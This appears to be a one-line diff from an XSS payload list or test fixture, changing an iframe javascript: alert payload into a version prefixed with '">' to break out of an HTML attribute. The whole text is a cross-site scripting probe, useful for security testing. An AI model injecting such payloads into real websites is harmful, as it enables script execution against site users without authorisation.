@@ -1,2 +1,2 @@
-<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+"><IFRAME SRC="javascript:alert('XSS');"></IFRAME>
 
